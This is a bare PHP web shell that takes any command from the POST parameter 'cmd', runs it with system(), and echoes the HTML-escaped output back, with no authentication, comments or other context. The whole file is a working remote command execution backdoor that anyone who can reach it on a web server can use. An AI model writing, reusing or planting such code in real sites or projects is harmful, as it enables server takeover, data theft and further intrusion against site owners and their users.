<?php
$cmd = $_POST['cmd'];

ob_start();
system("$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp");
$output = ob_get_contents();
if (!empty($output)) 
	echo str_replace(">", "&gt;", str_replace("<", "&lt;", $output));
?>

